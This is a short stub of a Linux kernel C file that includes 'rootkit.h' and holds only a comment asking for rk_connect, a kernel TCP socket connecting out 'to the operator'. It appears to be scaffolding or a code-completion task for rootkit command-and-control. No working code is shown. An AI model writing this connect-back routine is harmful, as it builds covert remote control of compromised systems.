// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <net/net_namespace.h>

#include "rootkit.h"

/* ------------------------------------------------------------------ */
/* Outbound TCP connect                                                */
/* ------------------------------------------------------------------ */

// Implement rk_connect: create a kernel TCP socket and connect to the operator.
